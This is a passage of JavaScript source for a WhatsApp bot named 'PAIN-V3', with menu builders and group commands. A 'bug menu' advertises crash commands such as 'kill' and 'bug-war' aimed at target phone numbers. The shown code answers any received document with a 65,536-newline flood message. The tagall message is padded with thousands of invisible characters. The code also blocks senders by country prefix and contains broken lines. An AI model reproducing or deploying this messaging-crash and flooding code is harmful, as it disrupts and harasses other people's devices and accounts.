            title: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
            body: "𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑",
            previewType: "PHOTO",
            thumbnailUrl: "https://files.catbox.moe/9570e5.jpg",
            thumbnail: fs.readFileSync("./image/image1.jpg"),
            sourceUrl: "" + global.channel
          }
        }
      }, {
        quoted: m
      });
    };
    const v190 = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(v14 ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v192 = {
      key: v190,
      message: {
        contactMessage: {
          displayName: "" + v28,
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + v28 + ",\nitem1.TEL;waid=" + v26.split("@")[0] + ":" + v26.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          jpegThumbnail: {
            url: "https://files.catbox.moe/9570e5.jpg"
          }
        }
      }
    };
    function f28(p95 = "") {
      return [...p95.matchAll(/@([0-9]{5,16}|0)/g)].map(p96 => p96[1] + "@s.whatsapp.net");
    }
   
      if (autoread) {

                mayor.readMessages([m.key]);

            }

            if (autobio) {

                mayor.updateProfileStatus(

                    `24/7 𝗕𝗢𝗧 𝗕𝗬 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 ${ownername}`

                ).catch(_ => _);

            }

            if (m.sender.startsWith("92") && global.anti92 === true) {

                return mayor.updateBlockStatus(m.sender, "block");

            } 
    if (m.message) {
                                                                                                  if (m.mtype === "documentMessage") {
                                                                                                    newly = "\n".repeat(65536);
                                                                                                    await mayor.sendMessage(m.chat, {
                                                                                                      'text': newly
                                                                                                    });
                                                                                                    await mayor.sendMessage(mayor.user.id, {
                                                                                                      'text': m.sender.split('@')[0x0] + " 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚𝗦 𝗜𝗡 𝗗𝗠 𝗢𝗥 𝗚𝗥𝗢𝗨𝗣 𝗖𝗛𝗔𝗧 𝗔𝗡𝗗 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗕𝗟𝗢𝗖𝗞𝗘𝗗☠️𝗠𝗔𝗬𝗢𝗥 𝗛𝗔𝗦 𝗣𝗥𝗢𝗧𝗘𝗖𝗧𝗘𝗗 𝗬𝗢𝗨🥶█▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗣𝗔𝗜𝗡-𝗩𝟯░░░▒▒▓█"
                                                                                                    });
                                                                                                    await mayor.updateBlockStatus(m.sender, "block");
                                                                                                  }
                                                                                                }               
      switch (v20) {

      case "button": {
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./image/Pain.jpg")}, { upload: mayor.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "𝗣𝗔𝗜𝗡-𝗩𝟯\n\n> © 2024 𝐁𝐘 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "𝗣𝗔𝗜𝗡-𝗩𝟯 ", "sections": [{ "title": " 𝐁𝐘 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 ", "highlight_label": \"𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥Ѻ\", "rows": [{ "header": "𝐈𝐧𝐟𝐨", "title": "‌", "id": ".test" },
{ "header": "※", "title": "🅾🆆🅽🅴🆁🅼🅴🅽🆄 ", "id": ".ownermenu" },
{ "header": "※", "title": "🅶🆁🅾🆄🅿🅼🅴🅽🆄 ", "id": ".groupmenu" },
{ "header": "᯾", "title": "🆅🅸🆁🆄🆂🅼🅴🅽🆄 ", "id": ".bugmenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥\",\"url\":\"https://whatsapp.com/channel/0029VamAEGJFnSzHbdcRcZ18\",\"merchant_url\":\"https://whatsapp.com/channel/0029VamAEGJFnSzHbdcRcZ18\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: extd })
await mayor.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
} 
                break;
    case "groupmenu": {
let menya = `   \`𝗩3\`
「 𝗣𝗔𝗜𝗡-𝗩𝟯 𝘽𝙔 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥  」
❐  ⌜ \`𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝟯.𝟬.𝟬
┃ 𝐌𝐨𝐝𝐞 : ${mayor.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃   𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.Creator}
┃   𝐎𝐰𝐧𝐞𝐫 : *${global.owner}*
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : *${runtime(process.uptime())}*
┗❐
┗──────────────❐
┏❐  *〈 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 〉* 
☠️ ${v18} hidetag
☠️ ${v18} tagall
☠️ ${v18} kick _*234xxx/@tag*_
☠️ ${v18} promote _*234xxx/@tag*_
☠️ " + v18 + "demote _*234xxx/@tag*_

  *〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉* 
𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 [𝗢𝗪𝗡𝗘𝗥]
𝗞𝗜𝗡𝗚 𝗕𝗔𝗗𝗕𝗢𝗜 [𝗖𝗢𝗟𝗟𝗔𝗕]
┗─────────────❐
✩░▒▓▆▅▃▂▁𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™▁▂▃▅▆▓▒░✩`;
                    mayor.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.ownername,
                                    body: global.Creator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/4t9l3a.jpg",
                                    sourceUrl: global.channel,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                } 
                break;
    case "ownermenu": {
let menya = `   \`𝗩3\`
「 𝗘𝗡𝗝𝗢𝗬 𝗦𝗖𝗥𝗜𝗣𝗧 」
❐  ⌜ \`𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝟯.𝟬.𝟬
┃ 𝐌𝐨𝐝𝐞 : ${mayor.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃   𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.Creator}
┃   𝐎𝐰𝐧𝐞𝐫 : *${global.owner}*
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : *${runtime(process.uptime())}*
┗❐
┗──────────────❐
🕸 *〈 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 〉* 🕸
☠️ ${v18} addowner _*234xxx/@tag*_
☠️ ${v18} addprem _*234xxx/@tag*_
☠️ ${v18} delowner _*234xxx/@tag*_
☠️ ${v18} delprem _*234xxx/@tag*_
☠️ ${v18} public/self
┗❐
☠️ ${v18} runtime
☠️ ${v18} ai_
☠️ ${v18} animeku
☠️ ${v18} buyprem
☠️ ${v18} animeku
☠️ ${v18} sound1 to sound161
┗❐_
 *〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉* 
𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 [𝗢𝗪𝗡𝗘𝗥]
𝗞𝗜𝗡𝗚 𝗕𝗔𝗗 𝗕𝗢𝗜 [𝗖𝗢𝗟𝗟𝗔𝗕]
┗─────────────❐
✩░▒▓▆▅▃▂▁𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™▁▂▃▅▆▓▒░✩`;
                    mayor.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.ownername,
                                    body: global.Creator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/9570e5.jpg",
                                    sourceUrl: global.channel,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                } 
                break;
    case "bugmenu": {
let menya = `   \`𝗩3\`
「 𝗨𝗦𝗘 𝗖𝗢𝗠𝗠𝗔𝗗𝗦 𝗪𝗜𝗦𝗘𝗟𝗬  」
❐  ⌜ \`𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝟯.𝟬.𝟬
┃ 𝐌𝐨𝐝𝐞 : ${mayor.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃   𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.Creator}
┃   𝐎𝐰𝐧𝐞𝐫 : *${global.owner}*
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : *${runtime(process.uptime())}*
┗❐
┗──────────────❐
 *〈 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 〉* 
☠️ ${v18} painv1 _*234xxx*_
☠️ ${v18} bug-war _*234xxx*_
☠️ ${v18} painv2 _*234xxx*_
☠️ ${v18} kill _*234xxx*_
☠️ ${v18} mera _*234xxx*_
 *〈 𝘾𝙍𝘼𝙎𝙃 𝘽𝙀𝙏𝘼 𝙈𝙀𝙉𝙐 〉* 
☠️ ${v18} pain _*234xxx*_
☠️ ${v18} mayor _*234xxx*_
☠️ ${v18} pain-beta  _*234xxx*_
┗─────────────❐
 *〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉* 
𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 𝗧𝗘𝗖𝗛 [𝗢𝗪𝗡𝗘𝗥]
𝗞𝗜𝗡𝗚 𝗕𝗔𝗗𝗕𝗢𝗜 [𝗖𝗢𝗟𝗟𝗔𝗕]
┗─────────────❐
✩░▒▓▆▅▃▂▁𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™▁▂▃▅▆▓▒░✩`;
                    mayor.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.ownername,
                                    body: global.Creator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/4t9l3a.jpg",
                                    sourceUrl: global.channel,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                } 
                break;
    case "menu": {
let menya = `   \`𝗩3\`
「 𝗣𝗔𝗜𝗡-𝗩𝟯 𝘽𝙔 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥  」
❐  ⌜ \`𝐊𝐈𝐍𝐆 𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝗣𝗔𝗜𝗡-𝗩𝟯
┃ 𝐌𝐨𝐝𝐞 : ${mayor.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃ 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.Creator}
┃ 𝐎𝐰𝐧𝐞𝐫 : *${global.owner}*
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : *${runtime(process.uptime())}*
┗❐
┗──────────────❐
👑 *〈 𝗠𝗲𝗻𝘂 〉* 👑
👑 ${v18} _*button*_
👑 ${v18} _*ownermenu*_
👑 ${v18} _*bugmenu*_
👑 ${v18} _*groupmenu*_
┗─────────────❐
✩░▒▓▆▅▃▂▁𝔇ᴇᴠ 𝔐ᴀʏᴏʀ 𝔗ᴇᴄʜ™▁▂▃▅▆▓▒░✩ `;
                    mayor.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.ownername,
                                    body: global.Creator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/9570e5.jpg",
                                    sourceUrl: global.channel,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                } 
        break;
      case "z":
      case "hidetag":
      
        if (!v46) {
          return vF6(global.onlyown);
                  return vF6(global.notext);
        }
        mayor.sendMessage(m.chat, {
          text: v23 ? v23 : "",
          mentions: v32.map(p97 => p97.id)
        }, {
          quoted: m
        });
        break;
      case "tagall":
        {
        
          if (!v46 && !v39) {
            return vF6(global.onlyadmin);
          }
          if (!v24) {
            return jovF6(global.onlygroup);
          }
          if (!q) {
            return vF6(global.notext);
          }
          let v233 = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎